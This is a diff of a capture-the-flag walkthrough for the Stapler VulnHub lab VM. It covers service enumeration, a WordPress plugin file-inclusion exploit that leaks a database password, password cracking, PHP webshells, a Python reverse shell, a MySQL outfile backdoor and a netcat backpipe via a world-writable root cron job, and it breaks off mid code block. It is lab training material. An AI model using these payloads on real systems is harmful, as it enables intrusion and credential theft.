@@ -14,7 +14,7 @@ Walkthrough for BsidesLondon 2016 VM: [Stapler](https://download.vulnhub.com/sta
  > TODO walkthough for setup
 
 get stapler from the url above & setup vm: unzip and import
-
+I'm using a sudoer standard user on Kali, but a VM will do just as well.
 
 -----------------------------
 
@@ -32,22 +32,26 @@ We can cut all the surplus text out and multi-thread with the following command:
 
 ``` bash
 nmap -T5 --max-parallelism=100 -sP 192.168.56.0/24 | awk -v RS='([0-9]+\\.){3}[0-9]+' 'RT{print RT}'
-# returns a couple of addresses quickly
+```
+Returns a couple of addresses quickly
+```
 192.168.56.1
 192.168.56.104
 ```
 
-because I'm lazy I'll assign the IP Address to a variable:
+Because I'm lazy I'll assign the IP Address to a variable:
 
 ``` bash
 STAPLER_IP=192.168.56.104
 ```
 
-Typically I'll run nmap in various levels of aggression, starting with a quick scan of the services:
+Typically I'll run nmap in various levels of aggression to be sure I don't miss anything, starting with a quick scan of the services:
 
 ``` bash
 nmap $STAPLER_IP
-# gives us:
+```
+gives us:
+```
 Host is up (0.00055s latency).
 Not shown: 992 filtered ports
 PORT     STATE  SERVICE
@@ -61,11 +65,13 @@ PORT     STATE  SERVICE
 3306/tcp open   mysql
 ```
 
-Interesting, lots of ports open, doom? - What is that? We'll check later but for now I'm going to check for hidden ports with a guess at versioning before we deep dive:
+Interesting, lots of standard service ports open. 666 and doom?!? We'll check later but for now I'm going to check for hidden ports with a guess at versioning before we deep dive:
 
 ``` bash
-sudo nmap -sV -p- $STAPLER_IP 
-#all ports scan with versions
+sudo nmap -sV -p- $STAPLER_IP
+```
+all ports scan with versions gives us:
+```
 Host is up (0.00034s latency).
 Not shown: 65523 filtered ports
 PORT      STATE  SERVICE     VERSION
@@ -127,37 +133,39 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds
 ```
 
+A sneaky extra web service in there as well on port 12380, might of missed that.
+
 -----------------------------
 
 ## Triage
 
-Before going any further it's prudent to perform a little analysis to get an idea of what we are facing.
+Before going any further it's prudent to perform a little analysis to get an idea of what we might be facing. This way we can tailor our strategy to work up to remote code execution (RCE).
 
 ```
 20/tcp    closed ftp-data
 21/tcp    open   ftp         vsftpd 2.0.8 or later
 ```
 
-There is an FTP server, probrably an Active server as port 20 returns closed. In passive mode the client initiates the connection and port 20 rarely refuses connection. This might imply IP whitelisting
+There is an FTP server, probrably an Active server as port 20 returns closed. In passive mode (default in most FTP Servers) the client initiates the connection and so port 20 would not explicitly refuse connection. This active configuration implies a bit of work went into the configuration, it could mean defensive measures like no anonymous logins or IP whitelisting. We will be careful probing this service initially.
 
 ```
 22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 ```
 
-Suggestive that box is Linux, windows rarely uses port 22 for ssh. This service will be hard to interact with if we can't get valid credentials 
+Suggestive that box is Linux, windows rarely uses port 22 for ssh Remote Desktop typically is served over 3389 by default. This service will be hard to interact with if we can't get valid credentials. 
 
 ```
 53/tcp    open   domain      dnsmasq 2.75
 ```
 
-DNS is often used to hide useful features on box via whitelisting. This is particularly true in more advanced boxes in VulnHub. It is difficult to enumerate without configuring networking on the attacker box, but can often be used for a quick enumeration win. I
+DNS is often overlooked by sys admins as it is a rarer service to re-configure after deploment. It can be used to hide services on boxes via whitelisting fqdn requests over http. This is particularly true in more advanced boxes for CTF events. It is difficult service to enumerate without configuring networking on the attacker box, but is often god for a quick win for more information on a box.
 
 ```
 80/tcp    open   http        PHP cli server 5.5 or later
 12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
 ```
 
-HTTP servers are open by default. This is typically the best place to start when enumerating a server as web sites are great places to get RCE.
+HTTP servers are open by default. This is typically the best place to start when enumerating a server as there are tonnes of automation options for web site enumeration.
 
 ```
 123/tcp   closed ntp
@@ -171,13 +179,13 @@ Network Time, useful to know it is closed but no help just now
 139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 ```
 
-SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet. The supporting ports 137 (name service) and 138 (datagram) are used for NetBIOS on the WinTEL stack. This helps nmap best guess a Linux service, interesting that we are using 139 and NOT 445.
+SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack which allows SMB to work over the internet. The supporting ports 137 (name service) and 138 (datagram) are used for NetBIOS on the WinTEL stack. This helps nmap best guess a Linux service, interesting that we are using 139 and NOT 445.
 
 ```
 3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
 ```
 
-Standard port for mysqldb access, this _should_ be set to local host-only access, could be useful but normally requires a login. Confirms that we have a LAMP stack on the box, and if we were bad guys this would be a value extraction service.
+Standard port for mysqldb access, this _should_ be set to local host-only access, could be useful but normally requires a login. Confirms that we have a LAMP stack on the box, and if we were bad guys this could be a good value extraction service.
 
 ```
 666/tcp   open   doom?
@@ -225,35 +233,42 @@ SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
 SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
 SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0"); 
 ```
-Could this be a custom app? Not low hanging fruit but possibly something interesting. 
+Could this be a custom app? Not a low hanging fruit but possibly something interesting. 
 
 -----------------------------
 ## Lets go Harder
 
-Time to get more intrusive with our recon.
+Time to get more intrusive with our recon and start poking the innards of the services.
 
 ### DNS
 
-Start port 53, it is quickest to check for special info and is easy to queue up scripts for.
-launching the following script is noisy, but useful for dns services 
-
-> TODO get outputs
+Starting on port 53, it is quickest to check for special info and is easy to queue up scripts for.
+launching the following script is noisy, but useful for dns services. nmap has some useful scripts we could use with the command below, but without configuring our hosts file it'll run a long time for little rewards. My go to is:
 
 ``` bash
 sudo nmap -Pn -sU -p 53 --script=dns* $STAPLER_IP
 ```
 It takes ages and _SPOILER_ there are no issues picked up here why?
 
-Lets investigate,
+Lets investigate manually:
 
 ``` bash
 nslookup $STAPLER_IP
+```
+
+returns:
+
+```
 ** server can't find 104.56.168.192.in-addr.arpa: NXDOMAIN
 ``` 
-Ah, the VM is not recognised on our DNS. This is pretty typical of Vulnhub Boxes as they aren't on our `real` network. We could set this to our /etc/hosts and continue our hunt, we won't for now as we have no idea what else there is and the configuration may be unesessary. 
-Lets go into manual mode, open interactive nslookup with ```nslookup``` to play with the following commands:
+Ah, the VM is not recognised on our DNS. This is pretty typical of Vulnhub Boxes as they aren't on our `real` network. We could set this to our /etc/hosts and continue our hunt, but I won't until it becomes a requirement.
 
-> TODO get outputs
+Lets go into manual mode instead, open interactive nslookup with 
+
+``` bash
+nslookup
+``` 
+to play with the following commands:
 
 ``` bash
 # list primary domain server: 
@@ -268,7 +283,7 @@ server 192.168.56.104
 # comes back
 ** server can't find 104.55.168.192.in-addr.arpa: REFUSED
 ```
-Darn, no quick wins here because we don't have permissions. Might be something we want to play with later, but lets park DNS for now and move on to something else.
+Darn, no quick wins here because we don't have permissions. Might be something we want to play with later so lets park DNS for now and move on to something else.
 
 -----------------------------
 
@@ -278,8 +293,11 @@ Lets aggressive scan the service to get an idea of what we have
 
 ``` bash
 nmap -A -p 139 $STAPLER_IP
+```
 
-#returns
+returns:
+
+```
 Nmap scan report for 192.168.56.104
 Host is up (0.00034s latency).
 
@@ -315,19 +333,17 @@ Nmap done: 1 IP address (1 host up) scanned in 41.52 seconds
 
 the __smb-security-mode__ script suggests we can enumerate with a guest login.
 
-A quick(ish) scripted enum to file for the server can be done via ```enum4linux```
-> TODO link file
+A quick(ish) scripted enum to [file](/assets/vulnhub_stuff/stapler/samba_enum.txt) for the server can be done via enum4linux
 
 ``` bash
 sudo enum4linux -U -S -G -P -o -n -i $STAPLER_IP > samba_enum.txt
 ```
-> TODO get outputs
-
 But we'll go oldschool:
 ``` bash
 smbclient -L $STAPLER_IP
-# blank password gives
-
+```
+using a blank password at the prompt gives:
+```
  Sharename       Type      Comment
  ---------       ----      -------
  print$          Disk      Printer Drivers
@@ -335,25 +351,75 @@ smbclient -L $STAPLER_IP
  tmp             Disk      All temporary files should be stored here
  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
 Reconnecting with SMB1 for workgroup listing.
-
-# on examination as kathy (//fred/kathy also works)
-
+```
+Lets see what kathy can see (note Fred's mention? //fred/kathy also works)
+```
 smbclient //kathy/kathy -I $STAPLER_IP -N
 ls
-cd kathy stuff\ # might need to tab it in!
-get todo-list.txt
-cd ..\backup
-# ooh wordpress-4.tar.gz, could be interesting for source code review useful for http
-get wordpress-4.tar.gz
-# ftp config as well
-get vsftpd.conf
+```
+gives
+```
+  .                                   D        0  Fri Jun  3 17:52:52 2016
+  ..                                  D        0  Mon Jun  6 22:39:56 2016
+  kathy_stuff                         D        0  Sun Jun  5 16:02:27 2016
+  backup                              D        0  Sun Jun  5 16:04:14 2016
 
+                19478204 blocks of size 1024. 16361644 blocks available
+```
+
+``` bash
+cd kathy stuff\ # might need to tab it in!
+ls
+```
+A file!
+```
+  .                                   D        0  Sun Jun  5 16:02:27 2016
+  ..                                  D        0  Fri Jun  3 17:52:52 2016
+  todo-list.txt                       N       64  Sun Jun  5 16:02:27 2016
+
+                19478204 blocks of size 1024. 16361644 blocks available
+```
+lets get [todo-list.txt](/assets/vulnhub_stuff/stapler/todo-list.txt)
+``` bash
+get todo-list.txt
+```
+Next lets see whats in backup
+``` bash
+cd ..\backup
+ls
+```
+ooh [wordpress-4.tar.gz](/assets/vulnhub_stuff/stapler/wordpress-4.tar.gz), could be interesting for source code review and an ftp config [file](/assets/vulnhub_stuff/stapler/vsftpd.conf)
+```
+  .                                   D        0  Sun Jun  5 16:04:14 2016
+  ..                                  D        0  Fri Jun  3 17:52:52 2016
+  vsftpd.conf                         N     5961  Sun Jun  5 16:03:45 2016
+  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 18:14:46 2015
+```
+Lets get the files
+```
+get wordpress-4.tar.gz
+get vsftpd.conf
+```
+Now we'll try the temp folder:
+```
 smbclient //kathy/tmp -I $STAPLER_IP -N
+ls
+```
+Another file:
+```
+  .                                   D        0  Sun Aug  4 21:03:32 2019
+  ..                                  D        0  Mon Jun  6 22:39:56 2016
+  ls                                  N      274  Sun Jun  5 16:32:58 2016
+
+```
+
+And get the ls [file](/assets/vulnhub_stuff/stapler/ls.txt):
+```
 get ls
 ```
 
 we can determin a few things from these files:
-FTP has anon login and fred and kathy are both users
+FTP has anon login and fred and kathy are both users.
 
 > __BONUS__ Eternal Red Exploit to root: 
 
@@ -438,7 +504,7 @@ mv doom doom.zip && unzip doom.zip
 
 > TODO get outputs
 
-this gives us ![message2.jpg](/assets/vulnhub_stuff/message2.jpg)
+this gives us ![message2.jpg](/assets/vulnhub_stuff/stapler/message2.jpg)
 ``` bash
 #check the jpeg for hidden stuff:
 file message2.jpg 
@@ -545,7 +611,8 @@ curl http://192.168.56.104:12380 > 12380_index.html
 code review gets another user __Zoe__
 
 and a base64 encoded image:
-![decoded_20190804155642.jpeg](/assets/vulnhub_stuff/decoded_20190804155642.jpeg)
+
+![decoded_20190804155642.jpeg](/assets/vulnhub_stuff/stapler/decoded_20190804155642.jpeg)
 
 the base64 encoding _might_ give us an avenue to attack later if we have trouble uploading a shell.
 
@@ -708,23 +775,888 @@ the exploit produces a success of sorts and a url.
 
 Following the url we get a 404. hmmmm so what happened? 
 
+lets take a closer look at the url parameters of the php page:
+/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
+
+the call is not directly to a plugin url, it is to admin-ajax.php from the wp-admin directory.
+
+quick google of this returns:
+
+`
+Introduced in WordPress 3.6 the WordPress Heartbeat API allows WordPress to communicate between the web-browser and the server. It allows for improved user session management, revision tracking, and auto saving. ... The WordPress Heartbeat API uses /wp-admin/admin-ajax.php to run AJAX calls from the web-browser.
+`
+
+ok so this is not the plugin but the WP site that is calling this
+
+Lets look at the options: action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
+
+action=ave_publishPost - action the admin-ajax.php is going to do
+title=random - filename generator for the published post
+short=1 - True
+term=1 - True
+thumb=[FILEPATH] - this is the image that is published
+
+looks like we are publishing a thumbnail picture via the ave_publishPost
+
+I try to find this method by running a grep for the method in extracted version of the backup code:
+
+```
+grep -rl "ave_publishPost" .
+```
+
+I get nothing, this is unexpected. I expected the backup code to have reference to this, closer invesigation into the source code, shows the Advanced-Video-Embed plugin is not there... bummer.
+
+This must be method specific to Advanced-Video-Embed, as it doesn't look like a standard method for WordPress.
+
+I google the source code for this, but it looks like the plugin has been pulled.
+Checking the exploit source code, gives me little more insight into what the flow is. 
+
+## Are we stuck?
+
+Well lets think about what the plugin goes, it allows an easy way to imbed video files. 
+We are esentially creating a malformed thumb image, there must be a location where this is stored.   
+The default directory for this is usually a child of wp-content.
+
+lets go there: ``` https://192.168.56.104:12380/blogblog/wp-content/```
+
+Ah ha! Directory listing!
+
+![wp-content.png](/assets/vulnhub_stuff/stapler/wp-content.png)
+
+and within uploads, what looks like a random image:
+
+![wp-uploads.png](/assets/vulnhub_stuff/stapler/wp-uploads.png)
+
+Trying to open in it in the browser gives us errors, but that is because the file is not actually a jpeg and the browser is expecting a jpeg, lets curl it:
+
+``` bash
+curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/108293608.jpeg
+```
+
+mwah hahaha! We have LFI! With the contents of the /etc/passwd we also have every system user, we can now attempt a fine scoped brute force login attempt.
+
+```
+root:x:0:0:root:/root:/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+messagebus:x:108:111::/var/run/dbus:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
+mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
+RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
+ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
+DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
+AParnell:x:1004:1004::/home/AParnell:/bin/bash
+SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
+MBassin:x:1006:1006::/home/MBassin:/bin/bash
+JBare:x:1007:1007::/home/JBare:/bin/bash
+LSolum:x:1008:1008::/home/LSolum:/bin/bash
+IChadwick:x:1009:1009::/home/IChadwick:/bin/false
+MFrei:x:1010:1010::/home/MFrei:/bin/bash
+SStroud:x:1011:1011::/home/SStroud:/bin/bash
+CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
+JKanode:x:1013:1013::/home/JKanode:/bin/bash
+CJoo:x:1014:1014::/home/CJoo:/bin/bash
+Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
+LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
+JLipps:x:1017:1017::/home/JLipps:/bin/sh
+jamie:x:1018:1018::/home/jamie:/bin/sh
+Sam:x:1019:1019::/home/Sam:/bin/zsh
+Drew:x:1020:1020::/home/Drew:/bin/bash
+jess:x:1021:1021::/home/jess:/bin/bash
+SHAY:x:1022:1022::/home/SHAY:/bin/bash
+Taylor:x:1023:1023::/home/Taylor:/bin/sh
+mel:x:1024:1024::/home/mel:/bin/bash
+kai:x:1025:1025::/home/kai:/bin/sh
+zoe:x:1026:1026::/home/zoe:/bin/bash
+NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
+www:x:1028:1028::/home/www:
+postfix:x:112:118::/var/spool/postfix:/bin/false
+ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
+elly:x:1029:1029::/home/elly:/bin/bash
+```
+
+Before we fire up a brute force attack, we should check to see if there are any other bits of information we can leverage. Reviewing the WP backup, I noticed there is no wp-config.php only wp-config-sample.php. wp-config.php is where an admin can hard code credentials to manage the dB, a dB we might be able to get access to if we can get root password. We know from earlier root login is possible on the dB, lets try and get the details.
+
+Lets create a new 'image' by going to:
+
+https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
+
+then curling:
+
+``` bash
+curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/1006632345.jpeg
+```
+
+quick way to refernce only the dB details:
+
+``` bash
+curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/1006632345.jpeg | grep "DB"
+```
+yields root:plbkac as the dB root password
+
+```
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'plbkac');
+define('DB_HOST', 'localhost');
+define('DB_CHARSET', 'utf8mb4');
+define('DB_COLLATE', '');
+define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
+```
+
+lets try logging in:
+
+``` Bash
+mysql -h $STAPLER_IP -u root -pplbkac 
+# note no spaces for password!
+
+```
+I'm in!
+
+```
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 32
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+```
+
+At this point I have value extraction, with access to the database there are many t
 
 
-# TODO!!!!
-Well lets look at what the plugin does
+lets get the usernames for the WP login:
 
-/blogblog/wp-content/uploads/
+``` msql
+use wordpress;
+select user_login,user_pass from wp_users;
+```
+yeilds: 
 
-> Bonus Shell upgrade - TODO
+```
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
+| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
+| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
+| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
+| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
+| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
+| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
+| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
+| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
+| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
+| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
+| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
+| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
+| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
+| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
+| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
++------------+------------------------------------+
+```
+
+Lets condense these down to [wp_users.txt](/assets/vulnhub_stuff/stapler/wp_users.txt) and try to crack the passwords with john the ripper.
+
+
+``` bash
+john wp_users.txt
+```
+
+we get some basic passwords from the default configuration:
+
+```
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+ylle             (Elly)
+monkey           (harry)
+football         (garry)
+cookie           (scott)
+# then in ASCII mode: 
+TOM              (Simon)
+```
+
+Brute force cracking based on ASCII string matches will take an age with this system, lets stop here and use the rockyou dictionary:
+
+```
+john wp_users.txt -wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+As john runs we begin to see passwords pop onto the screen. What we really want is the an account with wp-admin priveleges as this will give us full access to the wp-admin panel, which where we can abuse the site to get a reverse shell. By default the first user in a dB is the admin, if we can get the tool john to get user John's password we will be in a good postion.
+
+And look at that... we got John's password.
+
+```
+washere          (barry)
+incorrect        (John)
+0520             (Pam)
+passphrase       (heather)
+damachine        (Dave)
+partyqueen       (ZOE)
+```
+
+lets got to the admin panel and log in https://192.168.56.104:12380/blogblog/wp-admin/
+
+Success! 
+
+![wp-admin.png](/assets/vulnhub_stuff/stapler/wp-admin.png)
+
+
+At this point we want to try an achieve remote code execution (RCE). 
+As John's access is elevated we should have access to themes and plugins. Combine this with the fact that Word Press is served by PhP, 2 options immediately come to mind.
+
+1. Option A: Try to include webshell funtionality in a theme component.
+2. Option B: Try to upload a PhP shell as a wordpress plugin.
+3. Option C: Try to upload a PhP shell via OUTFILE in the mysql
+
+Any option is potentially valid, but I'm going to try modifying a theme page to include php code. Dropping either of these two following two snippets are a typical go to for code execution on the url:
+
+``` php
+<?php echo system($_GET["cmd"].' 2>&1'); ?>
+// or
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+```
+I have a through all the themes and can't find a php file I can edit.  
+At this point, the plugin is looking like a better option.
+
+If I can upload a php code in a file that launches a reverse shell I might get somewhere.
+
+Luckly Kali comes with a bunch in /usr/share/webshells/php/php-reverse-shell.php
+
+I'll edit the details so I can catch them in a netcat listener:
+
+``` php
+$ip = '192.168.56.1';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
+```
+
+and upload the file as a plugin 
+
+![evil-plugin.png](/assets/vulnhub_stuff/stapler/evil-plugin.png)
+
+when it asked for the FTP credentials I tried John's again but I recieved an auth error
+
+Going to the uploads directory though, I discover the shell upload succeeded:
+https://192.168.56.104:12380/blogblog/wp-content/uploads/
+
+
+Ok so now we attempt to bounce a shell back to the listner we set up:
+
+``` bash
+nc -nvlp 1337
+```
+
+and then we visit: https://192.168.56.105:12380/blogblog/wp-content/uploads/php-reverse-shell.php
+
+And nothing! Just a spining web loading page.
+If we wait long enough we'll see that we have code execution as the following error gets returned:
+
+``` error
+WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110) 
+```
+
+At this stage there are a few possibilities to why this failed, my first thoughts are either the box has firewall egress rules in place or I've made an error in my webshell code edits. 
+
+First lets change our shell to a web shell, this way we can perform som active recon as well as try code execution out on the victim.
+
+Open an editor and I put the following code into system-webshell.php:
+
+``` php
+<?php echo system($_GET["cmd"].' 2>&1'); ?>
+
+```
+
+I upload as before using John's credentials
+
+
+![system-webshell.png](/assets/vulnhub_stuff/stapler/system-webshell.png)
+
+and visit:
+
+https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php
+
+
+It looks like nothing has happened, but when I call the ls command on the url:
+
+https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=ls
+
+I get:
+
+![web-shell-proof.png](/assets/vulnhub_stuff/stapler/web-shell-proof.png)
+
+Throw a view-source: on to get a better view:
+
+view-source:https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=ls
+
+
+Ok, so we have execution, lets get a shell.
+This time we set it on a port we expect the firewall to allow, 21 (ftp)
+
+``` bash
+# we need sudo because 21 is a reserved port
+sudo nc -nvlp 21
+```
+
+Lets look to see what shells we can use:
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+I tend to have the most success with the python and perl shells when dealing with Linux, lets try the py one first:
+
+https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+We get a connection on our listener: 
+
+```
+listening on [any] 21 ...
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.105] 58040
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+> Bonus backdoor with mysql outfile
+
+while logged into the mysql service you can write a shell to the uploads root with the following:
+``` mysql
+select “<?php echo shell_exec($_GET[‘cmd’]);?>” into outfile ‘/var/www/https/blogblog/wp-content/uploads/mysql-shell.php’;
+```
+
+Execution is as before from the system-webshell.php route. This is riskier as there is no guarantee msql can write to the php executable directories, in this case however it can!
+
+from here lets spawn full bash in our new shell
 
 ``` bash
 python -c 'import pty; pty.spawn("/bin/bash")'
-# background with Ctl^Z
-stty raw -echo
-fg
+
 ```
 
-# Hit Hard!
+gives us
+
+```
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
+```
+
+We have a good level of control, but we are still missing the easy use of our bash tty setup.
+
+lets fix that, background the shell with Ctl^Z
+then in your original terminal forward the settings and restart the backround reverse shell with the following commands
+
+``` bash
+stty raw -echo
+fg
+# note you won't see the fg populate
+```
+
+At this point I have access to the system, lets abuse it.
+
+## Enumeration
+
+This is an art in its self, the author of this box also wrote a great starter guide for manual enumeration of linux called [basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+Going through the steps revels a few ways to get root
+
+## Cronos Master of All Jobs!
+
+Following the guide, poking around the system eventually leads to cron jobs.
+the cron.d folder is usually allocated for user defined jobs that don't fit the standard
+daily, hourly, monthly or weekly settings. Nothing irregular about that, but always a good place to start our checks
+``` bash
+ls -la /etc/cron.d/
+```
+
+gives
+
+```
+total 32
+drwxr-xr-x   2 root root  4096 Jun  3  2016 .
+drwxr-xr-x 100 root root 12288 Jun  7  2016 ..
+-rw-r--r--   1 root root   102 Jun  3  2016 .placeholder
+-rw-r--r--   1 root root    56 Jun  3  2016 logrotate
+-rw-r--r--   1 root root   589 Jul 16  2014 mdadm
+-rw-r--r--   1 root root   670 Mar  1  2016 php
+```
+
+checking in the jobs list for executions that are owned by root:
+
+``` bash
+cat /etc/cron.d/*
+```
+gives us an interesting find! A job that runs every 5 min
+
+```
+# snip
+*/5 *   * * *   root  
+# snip
+```
+
+what makes this interesting is that /usr/sbin/logrotate is usually the script to rotate logs
+not /usr/local/sbin/cron-logrotate.sh.
+
+Also running logrotate every 5 minutes seems excessive for a development site, lets check it out.
+
+``` bash
+ls -la /usr/local/sbin/cron-logrotate.sh
+```
+World writable! And executable!
+```
+-rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
+```
+
+lets take a look
+
+``` bash
+cat /usr/local/sbin/cron-logrotate.sh 
+```
+
+gives:
+
+```
+#Simon, you really need to-do something about this
+```
+
+Ok, so this means every 5 min root executes the contents of cron-logrotate.sh.
+Because this file is world writable all we need to do append a command to the end of it, wait 5 min and it'll execute as root.
+
+While my imagination runs wild with the possibilities, I'll just append a bash reverse shell and wait 5 min.
+
+lets make a reverse shell with msfvenom and create a simple web server for transfer.
+
+I tried a few different variants of shells, from bash to py and to msfvenom payloads but was met with no success. It is difficult to debug this, as we are executing blind and cannot see what is happening in the excution flow.
+
+on a scrape for tools to help I considered nc and telnet backpiping as the execute flag returned this error:
+
+```
+nc: invalid option -- 'e'
+```
+
+To 'backpipe' a connection we need to make a device node to act as our conduit for the connection.
+We then create a network relay to the attacker machine with all of the outputs directed to the device node file. Finally we pipe all of the contents as they are written to the backpipe to a shell, in turn granting code execution  
+
+Fairly standard backpipe shell command looks like this:
+
+``` bash
+mknod /tmp/backpipe p; nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
+
+```
+
+make a a FIFO (p type) node called backpipe, then open nc connection to the attacker over port 1337, accepting all input from the backpipe file, pipe all stdin from /bin/bash to backpipe.
+
+This command works provided I have a shell execution (which I do), but what if I get into a situation where I lose the shell? I will want make the cron job only open the shell, not create a new node thus a reliable backpipe invocation looks something like: 
+
+``` bash
+nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
+```
+
+lets create the device and pipe the command into the job 
+
+``` bash
